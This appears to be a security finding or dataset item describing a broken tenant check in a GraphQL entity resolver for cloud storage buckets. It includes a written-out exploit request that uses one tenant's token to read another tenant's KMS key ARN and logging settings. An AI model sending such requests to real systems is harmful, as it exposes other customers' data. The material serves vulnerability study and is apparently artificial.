diagnosis: The CloudStorageBucket entity resolver queries DynamoDB for bucket configuration metadata solely by reference.bucketId without checking the caller's cloud tenant ID. A multi-tenant client can discover KMS key ARNs, audit logging buckets, and storage configurations belonging to competing cloud tenants.
exploit_request:
POST /subgraph/storage HTTP/1.1
Host: infra-mesh.internal
Content-Type: application/json
Authorization: Bearer <tenant_b_token>

{"query": "query { _entities(representations: [{ __typename: \"CloudStorageBucket\", bucketId: \"bkt_tenant_a_prod_backups\" }]) { ... on CloudStorageBucket { bucketId kmsKeyArn loggingDestination } } }"}
